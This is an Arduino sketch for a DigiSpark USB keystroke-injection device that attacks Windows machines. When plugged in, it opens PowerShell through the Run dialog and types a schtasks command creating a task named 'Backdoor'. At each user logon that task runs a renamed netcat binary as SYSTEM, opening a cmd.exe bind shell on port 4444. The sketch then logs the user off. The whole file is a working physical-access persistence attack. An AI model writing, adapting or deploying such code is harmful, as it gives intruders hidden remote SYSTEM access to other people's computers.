#include "DigiKeyboard.h"

void setup() {
  // Wait for the machine to detect the DigiSpark, then send a wake-up signal
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  // Allow for full keyboard use, then open the Windows run dialog
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_RIGHT); // If in VirtualBox, will allow for left CTRL usage
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Use the run dialog to open a Powershell window
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Create scheduled task named "Backdoor" that will run a Netcat command to open a bind shell listner on user login
  DigiKeyboard.print("schtasks /create /tn \"Backdoor\" /tr \"C:\\winconfig.exe -L -p 4444 -e cmd.exe\" /sc onlogon /ru System");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Logoff the current user
  DigiKeyboard.print("logoff");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  
}
